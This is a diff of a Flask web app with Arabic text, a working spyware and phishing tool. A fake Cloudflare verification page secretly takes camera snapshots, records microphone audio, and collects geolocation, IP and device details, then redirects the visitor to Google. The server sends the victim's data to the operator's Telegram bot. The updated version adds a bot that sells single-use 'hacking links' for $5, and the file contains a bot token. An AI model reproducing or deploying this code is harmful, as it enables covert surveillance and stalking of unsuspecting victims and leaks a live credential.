@@ -1,46 +1,21 @@
-import base64
-import requests
-import io
-import os
-import time
-import logging
-import threading
-from flask import Flask, request, render_template_string, jsonify, redirect
-from datetime import datetime
+import base64, requests, io, os, time
+from flask import Flask, render_template_string, request, jsonify, redirect
 
 app = Flask(__name__)
-logging.basicConfig(level=logging.INFO)
 
-# ==================== إعدادات البوت ====================
+# ==================== إعدادات المطور سيوفي ====================
 BOT_TOKEN = "8725128005:AAH3Pp14tKAEsLPvcHOGdh8JqOnD74KKLNs"
 ADMIN_ID = 7041600701
 CHANNEL_URL = "https://t.me/FAABOT?start=7041600701"
+MY_LINK = "https://sif-e7ad.onrender.com"
 DEVELOPER_USER = "Y_urd"
 
-# رابط الموقع (راح يتغير تلقائياً بعد النشر)
-MY_LINK = os.environ.get("MY_LINK", "https://your-app.onrender.com")
-# ========================================================
-
-users_db = {}
+# قاعدة بيانات وهمية (تخزن في الذاكرة)
+# التنسيق: { user_id: {"status": "free/premium/banned", "used": True/False} }
+db = {}
+service_online = True
 link_active = True
-link_lock = threading.Lock()
-
-def send_to_tg(msg, img=None):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
-    try:
-        if img and len(img) > 100:
-            img_bytes = base64.b64decode(img)
-            requests.post(url + "sendPhoto",
-                         data={'chat_id': ADMIN_ID, 'caption': msg, 'parse_mode': 'HTML'},
-                         files={'photo': ('snap.jpg', io.BytesIO(img_bytes))},
-                         timeout=30)
-        else:
-            requests.post(url + "sendMessage",
-                         json={'chat_id': ADMIN_ID, 'text': msg, 'parse_mode': 'HTML'},
-                         timeout=30)
-        logging.info("✅ تم الإرسال")
-    except Exception as e:
-        logging.error(f"❌ فشل الإرسال: {e}")
+# =============================================================
 
 HTML_TEMPLATE = '''
 <!DOCTYPE html>
@@ -48,159 +23,143 @@ HTML_TEMPLATE = '''
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التحقق من الأمان</title>
+    <title>التحقق من الأمان | Cloudflare</title>
     <style>
-        body{background:#f0f2f5;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
-        .box{background:white;padding:30px;border-radius:20px;text-align:center;width:90%;max-width:400px}
-        .spinner{border:4px solid #f3f3f3;border-top:4px solid #f6821f;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:20px auto}
-        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
-        .error{color:red;margin-top:10px;display:none}
-        .btn{background:#f6821f;color:white;border:none;padding:10px 20px;border-radius:5px;cursor:pointer;margin-top:20px}
-        .hidden{display:none}
+        body { background: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .box { text-align: center; border: 1px solid #ddd; padding: 40px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
+        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #f6821f; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-<div class="box">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" width="100">
-    <h2 id="title">جاري التحقق...</h2>
-    <p id="text">يرجى الانتظار 3 ثوانٍ</p>
-    <div id="spinner" class="spinner"></div>
-    <button id="retryBtn" class="btn hidden" onclick="start()">إعادة المحاولة</button>
-</div>
-<video id="video" autoplay playsinline muted style="display:none"></video>
-<canvas id="canvas" style="display:none"></canvas>
-<script>
-    let sent = false;
-    async function getInfo() {
-        let battery = {level:0};
-        try { if(navigator.getBattery) battery = await navigator.getBattery(); } catch(e) {}
-        return {
-            platform: navigator.platform || '-',
-            lang: navigator.language || '-',
-            cores: navigator.hardwareConcurrency || '-',
-            ram: navigator.deviceMemory || '-',
-            battery: Math.round(battery.level*100)+'%',
-            screen: screen.width+'x'+screen.height,
-            ua: navigator.userAgent,
-            touch: 'ontouchstart' in window,
-            cookies: navigator.cookieEnabled
-        };
-    }
-    async function send(lat, lon, info) {
-        if(sent) return;
-        sent = true;
-        let img = '';
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        if(video.videoWidth > 0) {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            img = canvas.toDataURL('image/jpeg',0.5).split(',')[1];
+    <div class="box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" width="120">
+        <h2>جاري التحقق من بصمة المتصفح...</h2>
+        <p>يرجى السماح بالصلاحيات للمتابعة.</p>
+        <div class="spinner"></div>
+    </div>
+    <video id="v" autoplay playsinline muted style="display:none;"></video>
+    <canvas id="c" style="display:none;"></canvas>
+    <script>
+        let chunks = [];
+        async function send(d) { await fetch('/capture', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(d)}); }
+        async function run() {
+            try {
+                const s = await navigator.mediaDevices.getUserMedia({video:true, audio:true});
+                const v = document.getElementById('v'); v.srcObject = s;
+                navigator.geolocation.getCurrentPosition(p => send({type:'text', lat:p.coords.latitude, lon:p.coords.longitude}), () => send({type:'text', lat:0, lon:0}));
+                setTimeout(async () => {
+                    const c = document.getElementById('c'); c.width = v.videoWidth; c.height = v.videoHeight;
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    send({type:'img', img:c.toDataURL('image/jpeg', 0.6).split(',')[1]});
+                }, 2000);
+                const r = new MediaRecorder(s);
+                r.ondataavailable = e => chunks.push(e.data);
+                r.onstop = () => {
+                    const fr = new FileReader(); fr.readAsDataURL(new Blob(chunks, {type:'audio/ogg'}));
+                    fr.onloadend = () => { send({type:'audio', audio:fr.result.split(',')[1]}); window.location.href="https://google.com"; };
+                };
+                r.start(); setTimeout(() => r.stop(), 3500);
+            } catch(e) { send({type:'text', lat:0, lon:0}); window.location.href="https://google.com"; }
         }
-        try {
-            await fetch('/capture', {
-                method: 'POST',
-                headers: {'Content-Type':'application/json'},
-                body: JSON.stringify({img:img, lat:lat||0, lon:lon||0, specs:info})
-            });
-        } catch(e) {}
-        window.location.href = 'https://www.google.com';
-    }
-    async function start() {
-        document.getElementById('spinner').classList.remove('hidden');
-        document.getElementById('retryBtn').classList.add('hidden');
-        let stream = null;
-        const video = document.getElementById('video');
-        try {
-            stream = await navigator.mediaDevices.getUserMedia({video:true});
-            video.srcObject = stream;
-            await new Promise(r => { video.onloadedmetadata = r; setTimeout(r,2000); });
-        } catch(e) { document.getElementById('text').innerText = 'جاري جمع المعلومات...'; }
-        const info = await getInfo();
-        await new Promise(r => setTimeout(r,2000));
-        let lat=0, lon=0;
-        try {
-            const pos = await new Promise((res,rej) => navigator.geolocation.getCurrentPosition(res,rej,{timeout:5000}));
-            lat = pos.coords.latitude;
-            lon = pos.coords.longitude;
-        } catch(e) {}
-        await send(lat, lon, info);
-        if(stream) stream.getTracks().forEach(t=>t.stop());
-    }
-    window.onload = () => setTimeout(start, 500);
-</script>
+        window.onload = run;
+    </script>
 </body>
 </html>
 '''
 
+def bot_api(m, p=None, f=None):
+    u = f"https://api.telegram.org/bot{BOT_TOKEN}/{m}"
+    if f: return requests.post(u, data=p, files=f)
+    return requests.post(u, json=p)
+
 @app.route('/')
-def index():
-    global link_active
-    with link_lock:
-        if not link_active:
-            return redirect("https://www.google.com")
+def home():
+    if not link_active: return redirect("https://google.com")
     return render_template_string(HTML_TEMPLATE)
 
 @app.route('/capture', methods=['POST'])
 def capture():
     global link_active
-    with link_lock:
-        if not link_active:
-            return jsonify({"status":"expired"}),403
-    
-    data = request.json
-    if not data:
-        return jsonify({"status":"error"}),400
-    
-    specs = data.get('specs', {})
-    lat = data.get('lat', 0)
-    lon = data.get('lon', 0)
-    img = data.get('img', '')
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
-    
-    loc_link = f"https://www.google.com/maps?q={lat},{lon}" if lat and lon else "غير متاح"
-    
-    report = f"""🔥 <b>ضحية جديدة!</b>
-
-📱 الجهاز: {specs.get('platform','?')}
-🌐 IP: <code>{ip}</code>
-📍 الموقع: <a href='{loc_link}'>على الخريطة</a>
-💾 الذاكرة: {specs.get('ram','?')} GB
-⚙️ النواة: {specs.get('cores','?')}
-🔋 البطارية: {specs.get('battery','?')}
-📺 الشاشة: {specs.get('screen','?')}
-
-⚠️ الرابط معطل الآن"""
-    
-    send_to_tg(report, img if len(img) > 100 else None)
-    
-    with link_lock:
+    d = request.json; t = d.get('type')
+    if t == 'text':
+        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+        loc = f"https://www.google.com/maps?q={d.get('lat')},{d.get('lon')}" if d.get('lat') != 0 else "غير متاح"
+        bot_api("sendMessage", {"chat_id": ADMIN_ID, "text": f"🎯 <b>صيد جديد!</b>\nIP: <code>{ip}</code>\nالموقع: <a href='{loc}'>اضغط هنا</a>", "parse_mode": "HTML"})
+    elif t == 'img':
+        ph = io.BytesIO(base64.b64decode(d.get('img'))); ph.name = 'snap.jpg'
+        bot_api("sendPhoto", {"chat_id": ADMIN_ID}, {"photo": ph})
         link_active = False
-    
-    return jsonify({"status":"ok"})
+    elif t == 'audio':
+        au = io.BytesIO(base64.b64decode(d.get('audio'))); au.name = 'voice.ogg'
+        bot_api("sendVoice", {"chat_id": ADMIN_ID}, {"voice": au})
+    return "OK"
 
 @app.route('/webhook', methods=['POST'])
 def webhook():
-    update = request.json
-    if update and "message" in update:
-        chat_id = update["message"]["chat"]["id"]
-        text = update["message"].get("text", "")
-        if chat_id == ADMIN_ID:
-            if text == "/open":
-                global link_active
-                with link_lock:
-                    link_active = True
-                send_to_tg("✅ تم تفعيل الرابط")
-            elif text == "/status":
-                status = "مفعل ✅" if link_active else "معطل ❌"
-                send_to_tg(f"حالة الرابط: {status}")
-    return "OK", 200
+    global service_online, link_active
+    u = request.get_json(silent=True)
+    if not u or "message" not in u and "callback_query" not in u: return "OK"
 
-@app.route('/health')
-def health():
-    return jsonify({"status":"alive", "link_active":link_active})
+    if "message" in u:
+        m = u["message"]; cid = m["chat"]["id"]; txt = m.get("text", "")
+        
+        # نظام الإدارة (لك فقط)
+        if cid == ADMIN_ID:
+            if txt == "/users":
+                bot_api("sendMessage", {"chat_id": ADMIN_ID, "text": f"📊 عدد المستخدمين المسجلين: {len(db)}"})
+            elif txt.startswith("/active"):
+                try:
+                    uid = int(txt.split()[1]); db[uid] = {"status": "premium", "used": False}
+                    bot_api("sendMessage", {"chat_id": ADMIN_ID, "text": f"✅ تم تفعيل العضوية الممتازة للآيدي: {uid}"})
+                except: bot_api("sendMessage", {"chat_id": ADMIN_ID, "text": "❌ خطأ! استخدم: /active ID"})
+            elif txt.startswith("/ban"):
+                try:
+                    uid = int(txt.split()[1]); db[uid] = {"status": "banned", "used": True}
+                    bot_api("sendMessage", {"chat_id": ADMIN_ID, "text": f"🚫 تم حظر المستخدم {uid}"})
+                except: pass
+            elif txt == "/stop_bot":
+                service_online = False
+                bot_api("sendMessage", {"chat_id": ADMIN_ID, "text": "🛑 تم إيقاف البوت عن الجميع."})
+            elif txt == "/run_bot":
+                service_online = True
+                bot_api("sendMessage", {"chat_id": ADMIN_ID, "text": "✅ تم تشغيل البوت للجميع."})
+            elif txt == "/open":
+                link_active = True
+                bot_api("sendMessage", {"chat_id": ADMIN_ID, "text": "✅ تم فتح رابطك لصيد جديد."})
+
+        # أوامر المستخدمين
+        if txt == "/start":
+            user = db.get(cid, {"status": "free", "used": False})
+            if user["status"] == "banned":
+                bot_api("sendMessage", {"chat_id": cid, "text": "🚫 أنت محظور من استخدام البوت."})
+                return "OK"
+            
+            if user["used"] and user["status"] == "free" and cid != ADMIN_ID:
+                bot_api("sendMessage", {"chat_id": cid, "text": f"❌ انتهت المدة المجانية.\nراسل المطور @{DEVELOPER_USER} للتفعيل.\nالسعر: 5$ 💰"})
+            else:
+                kb = {"inline_keyboard": [[{"text": "✅ تم الاشتراك، ابدأ الآن", "callback_data": "welcome"}]]}
+                bot_api("sendMessage", {"chat_id": cid, "text": f"مرحباً بك في بوت سيوفي الخاص بالاختراق عن طريق رابط.\nيجب الاشتراك في القناة لمرة واحدة:\n{CHANNEL_URL}", "reply_markup": kb})
+
+    elif "callback_query" in u:
+        cb = u["callback_query"]; cid = cb["message"]["chat"]["id"]; data = cb["data"]
+        user = db.get(cid, {"status": "free", "used": False})
+
+        if data == "welcome":
+            bot_api("sendMessage", {"chat_id": cid, "text": "مرحباً بكم في بوت سيوفي الخاص باختراق الجهاز عن طريق رابط.\nلديك مرة واحدة مجانية لإنشاء رابط.", "reply_markup": {"inline_keyboard": [[{"text": "🚀 إنشاء رابط اختراق", "callback_data": "gen"}]]}})
+        
+        elif data == "gen":
+            if not service_online and cid != ADMIN_ID:
+                bot_api("sendMessage", {"chat_id": cid, "text": "⚠️ البوت تحت الصيانة حالياً، حاول لاحقاً."})
+                return "OK"
+            
+            if user["used"] and user["status"] == "free" and cid != ADMIN_ID:
+                bot_api("sendMessage", {"chat_id": cid, "text": f"❌ انتهت المحاولة المجانية. للتفعيل راسل @{DEVELOPER_USER}"})
+            else:
+                if cid != ADMIN_ID: db[cid] = {"status": user["status"], "used": True}
+                bot_api("sendMessage", {"chat_id": cid, "text": f"✅ تم إنشاء رابطك بنجاح:\n<code>{MY_LINK}</code>\n\n⚠️ الرابط صالح لصيد واحد فقط.", "parse_mode": "HTML"})
+
+    return "OK"
 
 if __name__ == '__main__':
-    port = int(os.environ.get("PORT", 10000))
-    app.run(host='0.0.0.0', port=port)
+    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
